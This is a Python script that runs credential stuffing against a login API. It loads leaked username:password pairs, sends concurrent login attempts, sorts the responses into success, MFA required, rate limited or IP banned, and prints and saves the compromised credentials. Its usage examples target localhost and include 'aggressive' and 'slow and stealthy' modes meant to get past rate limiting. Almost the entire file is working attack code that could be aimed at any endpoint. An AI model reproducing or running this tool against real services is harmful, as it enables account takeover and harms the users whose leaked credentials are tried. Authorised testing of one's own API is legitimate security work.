#!/usr/bin/env python3
"""
Credential Stuffing Attack Script
Simulates attacks using leaked username:password combinations against the auth API.
"""

import argparse
import asyncio
import json
import sys
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional

import httpx
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.table import Table

console = Console()


class CredentialStuffingAttack:
    """Credential stuffing attack against login API with MFA support"""

    def __init__(
        self,
        target: str,
        credentials_file: str,
        max_concurrent: int = 5,
        delay: float = 0.5,
        timeout: float = 10.0,
    ):
        self.target = target
        self.credentials_file = Path(credentials_file)
        self.max_concurrent = max_concurrent
        self.delay = delay
        self.timeout = timeout
        self.results = {
            "timestamp": datetime.utcnow().isoformat(),
            "target": target,
            "total_attempts": 0,
            "successful_logins": 0,
            "mfa_required": 0,
            "failed_attempts": 0,
            "rate_limited": 0,
            "blocked_ips": 0,
            "credentials": [],
        }

    def load_credentials(self) -> List[Dict[str, str]]:
        """Load credentials from file (format: username:password)"""
        credentials = []
        with open(self.credentials_file, "r") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if ":" in line:
                    username, password = line.split(":", 1)
                    credentials.append({"username": username, "password": password})
        return credentials

    async def attempt_login(
        self, client: httpx.AsyncClient, username: str, password: str
    ) -> Dict:
        """Attempt login with given credentials"""
        try:
            response = await client.post(
                self.target,
                json={"username": username, "password": password},
                timeout=self.timeout,
            )

            result = {
                "username": username,
                "password": password,
                "status_code": response.status_code,
                "timestamp": datetime.utcnow().isoformat(),
            }

            if response.status_code == 200:
                data = response.json()
                if data.get("requires_mfa"):
                    result["outcome"] = "mfa_required"
                    result["challenge_id"] = data.get("challenge_id")
                    self.results["mfa_required"] += 1
                else:
                    result["outcome"] = "success"
                    self.results["successful_logins"] += 1
            elif response.status_code == 401:
                result["outcome"] = "failed"
                self.results["failed_attempts"] += 1
            elif response.status_code == 403:
                result["outcome"] = "blocked"
                result["message"] = "IP banned"
                self.results["blocked_ips"] += 1
            elif response.status_code == 429:
                result["outcome"] = "rate_limited"
                self.results["rate_limited"] += 1
            else:
                result["outcome"] = "error"
                result["message"] = response.text

            return result

        except httpx.TimeoutException:
            return {
                "username": username,
                "password": password,
                "outcome": "timeout",
                "timestamp": datetime.utcnow().isoformat(),
            }
        except Exception as e:
            return {
                "username": username,
                "password": password,
                "outcome": "error",
                "error": str(e),
                "timestamp": datetime.utcnow().isoformat(),
            }

    async def run_attack(self):
        """Execute credential stuffing attack"""
        console.print(
            f"[bold cyan]Credential Stuffing Attack[/bold cyan] against {self.target}"
        )

        credentials = self.load_credentials()
        self.results["total_attempts"] = len(credentials)

        console.print(
            f"Loaded [bold]{len(credentials)}[/bold] credential pairs from {self.credentials_file}"
        )
        console.print(
            f"Max concurrent: {self.max_concurrent}, Delay: {self.delay}s\n"
        )

        async with httpx.AsyncClient() as client:
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                console=console,
            ) as progress:
                task = progress.add_task(
                    "Testing credentials...", total=len(credentials)
                )

                semaphore = asyncio.Semaphore(self.max_concurrent)

                async def limited_attempt(cred):
                    async with semaphore:
                        result = await self.attempt_login(
                            client, cred["username"], cred["password"]
                        )
                        self.results["credentials"].append(result)
                        progress.advance(task)
                        await asyncio.sleep(self.delay)
                        return result

                await asyncio.gather(*[limited_attempt(cred) for cred in credentials])

    def print_summary(self):
        """Print attack summary"""
        console.print("\n[bold green]Attack Summary[/bold green]")

        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Metric", style="cyan")
        table.add_column("Count", justify="right", style="yellow")

        table.add_row("Total Attempts", str(self.results["total_attempts"]))
        table.add_row("Successful Logins", str(self.results["successful_logins"]))
        table.add_row("MFA Required", str(self.results["mfa_required"]))
        table.add_row("Failed Attempts", str(self.results["failed_attempts"]))
        table.add_row("Rate Limited", str(self.results["rate_limited"]))
        table.add_row("Blocked (IP Ban)", str(self.results["blocked_ips"]))

        console.print(table)

        # Show successful credentials
        if self.results["successful_logins"] > 0 or self.results["mfa_required"] > 0:
            console.print("\n[bold red]⚠️  Compromised Credentials:[/bold red]")
            for cred in self.results["credentials"]:
                if cred["outcome"] in ["success", "mfa_required"]:
                    console.print(
                        f"  [green]✓[/green] {cred['username']}:{cred['password']} "
                        f"({cred['outcome']})"
                    )

    def save_results(self):
        """Save attack results to JSON file"""
        results_dir = Path(__file__).parent / "results"
        results_dir.mkdir(exist_ok=True)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = results_dir / f"credential_stuffing_{timestamp}.json"

        with open(filename, "w") as f:
            json.dump(self.results, f, indent=2)

        console.print(f"\n[dim]Results saved to: {filename}[/dim]")


def main():
    parser = argparse.ArgumentParser(
        description="Credential Stuffing Attack Script",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic attack with default settings
  python credential_stuffing.py --target http://localhost:8000/auth/login \\
    --credentials wordlists/leaked-credentials.txt

  # Aggressive attack (faster, more concurrent)
  python credential_stuffing.py --target http://localhost:8000/auth/login \\
    --credentials wordlists/leaked-credentials.txt \\
    --max-concurrent 10 --delay 0.1

  # Slow and stealthy attack
  python credential_stuffing.py --target http://localhost:8000/auth/login \\
    --credentials wordlists/leaked-credentials.txt \\
    --max-concurrent 1 --delay 2.0
""",
    )

    parser.add_argument(
        "--target",
        required=True,
        help="Target login endpoint URL (e.g., http://localhost:8000/auth/login)",
    )
    parser.add_argument(
        "--credentials",
        required=True,
        help="Path to credentials file (format: username:password per line)",
    )
    parser.add_argument(
        "--max-concurrent",
        type=int,
        default=5,
        help="Maximum concurrent requests (default: 5)",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.5,
        help="Delay between requests in seconds (default: 0.5)",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=10.0,
        help="Request timeout in seconds (default: 10.0)",
    )

    args = parser.parse_args()

    attack = CredentialStuffingAttack(
        target=args.target,
        credentials_file=args.credentials,
        max_concurrent=args.max_concurrent,
        delay=args.delay,
        timeout=args.timeout,
    )

    try:
        asyncio.run(attack.run_attack())
        attack.print_summary()
        attack.save_results()
        return 0
    except KeyboardInterrupt:
        console.print("\n[yellow]Attack interrupted by user[/yellow]")
        attack.print_summary()
        attack.save_results()
        return 1
    except Exception as e:
        console.print(f"\n[bold red]Error:[/bold red] {e}")
        return 1


if __name__ == "__main__":
    sys.exit(main())

